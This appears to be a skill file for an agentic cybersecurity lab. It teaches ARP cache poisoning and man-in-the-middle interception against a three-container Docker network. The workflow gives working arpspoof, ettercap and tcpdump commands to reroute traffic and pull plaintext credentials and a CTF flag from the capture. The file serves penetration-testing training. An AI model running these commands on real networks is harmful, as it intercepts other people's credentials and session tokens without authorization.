---
name: performing-arp-spoofing-in-lab
description: >-
  Perform ARP spoofing and man-in-the-middle (MITM) attacks within isolated LAN
  environments using arpspoof and ettercap to intercept traffic between two hosts.
  Covers ARP cache poisoning, traffic forwarding, and credential sniffing in a
  controlled Docker lab network.
domain: cybersecurity
subdomain: lateral-movement
tags: [arp-spoofing, mitm, lan-attacks, network-security, arpspoof, ettercap, intermediate]
difficulty: intermediate
version: "1.0.0"
author: RashpreetS01
license: Apache-2.0
mitre_techniques:
  - T1557.002
---

> **Educational Use Only** — All techniques described here must only be used in authorized, isolated lab environments. Never use against systems you do not own or have explicit written permission to test.

## When to Use

Use this skill during authorized internal network penetration tests when assessing the susceptibility of a LAN segment to MITM attacks. It applies in CTF challenges where traffic interception is required to capture credentials or session tokens. It is also relevant when evaluating whether ARP inspection and dynamic ARP inspection (DAI) controls are properly configured on network switches.

## Prerequisites

- Docker and Docker Compose installed on the host machine
- Basic understanding of the ARP protocol and how IP-to-MAC resolution works
- Familiarity with Linux networking tools (`ip`, `arp`, `tcpdump`)
- Lab: `labs/network/arp-spoofing` — start with `agentlab start arp-spoofing`

## Workflow

### Step 1: Start the Lab Environment

Launch the isolated three-container lab (attacker, victim, gateway) connected on an internal Docker bridge network with no internet access.

```bash
agentlab start arp-spoofing
# Containers: attacker (172.20.0.10), victim (172.20.0.20), gateway (172.20.0.1)
# Enter attacker shell: agentlab exec arp-spoofing bash
```

### Step 2: Enumerate the LAN Segment

Identify target IP and MAC addresses before poisoning the ARP cache.

```bash
# From inside the attacker container
ip addr show eth0
arp-scan --interface=eth0 172.20.0.0/24
# Note victim IP (172.20.0.20) and gateway IP (172.20.0.1)
```

### Step 3: Enable IP Forwarding

Enable kernel IP forwarding so intercepted packets are relayed to their destination, keeping the MITM invisible to both endpoints.

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
# Verify
cat /proc/sys/net/ipv4/ip_forward
```

### Step 4: Poison the ARP Caches

Run arpspoof in two directions simultaneously — telling the victim the attacker is the gateway, and telling the gateway the attacker is the victim.

```bash
# Terminal 1: Tell victim that attacker is the gateway
arpspoof -i eth0 -t 172.20.0.20 172.20.0.1 &

# Terminal 2: Tell gateway that attacker is the victim
arpspoof -i eth0 -t 172.20.0.1 172.20.0.20 &
```

### Step 5: Capture Intercepted Traffic

With ARP caches poisoned, all traffic between victim and gateway flows through the attacker. Capture it with tcpdump or ettercap.

```bash
# Passive sniff — capture all traffic between the two hosts
tcpdump -i eth0 -w /tmp/capture.pcap host 172.20.0.20 and host 172.20.0.1

# Or use ettercap for live credential extraction
ettercap -T -i eth0 -M arp:remote /172.20.0.20// /172.20.0.1//
```

### Step 6: Verify Results

Confirm ARP poisoning succeeded and extract the flag from captured traffic.

```bash
# On victim container (separate terminal), check poisoned ARP cache
arp -n
# Should show attacker's MAC for gateway IP

# Extract HTTP credentials from pcap
strings /tmp/capture.pcap | grep -i "password\|pass=\|flag"
agentlab verify arp-spoofing "FLAG{...}"
```

## Key Concepts

- **ARP Spoofing**: Sending gratuitous ARP replies that map an attacker-controlled MAC address to a legitimate IP, poisoning the ARP cache of target hosts.
- **Man-in-the-Middle (MITM)**: A network attack position where the attacker transparently relays and can inspect or modify traffic between two communicating parties.
- **IP Forwarding**: The kernel setting that allows a host to route packets it receives but did not originate, essential for maintaining connectivity during a MITM attack.
- **Gratuitous ARP**: An unsolicited ARP reply broadcast that updates the ARP cache of all hosts on the segment — the mechanism exploited by ARP spoofing.
- **Dynamic ARP Inspection (DAI)**: A switch-level defense that validates ARP packets against a DHCP snooping binding table, blocking spoofed replies.

## Tools

| Tool | Purpose | Install |
|------|---------|---------|
| `arpspoof` | Send crafted ARP replies to poison target caches | `apt install dsniff` |
| `ettercap` | All-in-one MITM framework with plugin support | `apt install ettercap-text-only` |
| `arp-scan` | Discover live hosts and MAC addresses on LAN | `apt install arp-scan` |
| `tcpdump` | Capture raw network packets for offline analysis | `apt install tcpdump` |
| `Wireshark` | GUI packet analysis of captured pcap files | `apt install wireshark` |

## Output

On success, you should observe:
- The victim's ARP table shows the attacker's MAC address mapped to the gateway IP
- `tcpdump` or `ettercap` displays plaintext credentials or session tokens in transit
- HTTP GET/POST requests from the victim are visible in the packet capture
- Flag captured in the format `FLAG{...}`

---

*All labs referenced in this skill run in isolated Docker environments with `internal: true` networks. No internet access. Educational use in authorized environments only.*
